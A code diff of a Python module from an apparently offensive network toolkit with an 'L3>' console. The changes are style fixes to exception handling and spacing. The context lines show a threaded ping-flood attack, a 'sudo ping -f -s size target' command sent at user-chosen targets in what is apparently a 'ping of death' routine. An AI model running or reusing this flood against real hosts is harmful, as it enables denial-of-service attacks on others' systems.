@@ -4,7 +4,7 @@ from os import system
 try:
 	from os import geteuid
 	geteuid_exists = True
-except:
+except ImportError:
 	geteuid_exists = False
 from time import sleep
 import socket
@@ -15,6 +15,7 @@ except Exception as e:
 	quit()
 event = event()
 tools = tools()
+
 
 class Main:
 	def __init__(selfie, console):
@@ -110,7 +111,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			print(e)
 			try:
 				input("[Press enter to continue without nmap]")
-			except:
+			except Exception:
 				quit()
 		self.banner()
 
@@ -245,7 +246,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			targets = [target]
 		del(target)
 		for target in targets:
-			if geteuid()==0:
+			if geteuid() == 0:
 				print(("Starting thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 				killcom = ('sudo ping -f -q -s %s %s %s  > /dev/null' % (size, feat, target)).replace("  ", " ")
 			else:
@@ -269,7 +270,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				system("killall ping")
 				print("Attack abort.")
 				quit()
-			except:
+			except Exception:
 				system("killall ping")
 				print("Attack abort.")
 				quit()
@@ -282,6 +283,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			quit()
 		else:
 			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)
+
 
 def setup(console):
 	console.ps1 = "\033[1;32;0mL3> "
